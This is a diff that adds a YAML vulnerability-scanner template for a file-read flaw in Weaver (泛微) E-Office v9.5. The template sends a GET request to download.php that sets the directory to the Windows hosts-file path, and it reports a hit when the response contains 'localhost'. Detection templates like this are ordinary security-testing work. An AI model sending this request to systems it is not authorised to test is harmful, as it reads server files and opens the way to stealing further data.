@@ -1,0 +1,12 @@
+name: 泛微-EOffice-v9.5-download-文件读取
+description: >
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/general/file_folder/file_new/neworedit/download.php?filename=hosts&dir=C:\\Windows\\System32\\drivers\\etc\\"
+    expression:
+      status: 200
+      body_all:
+        - "localhost"
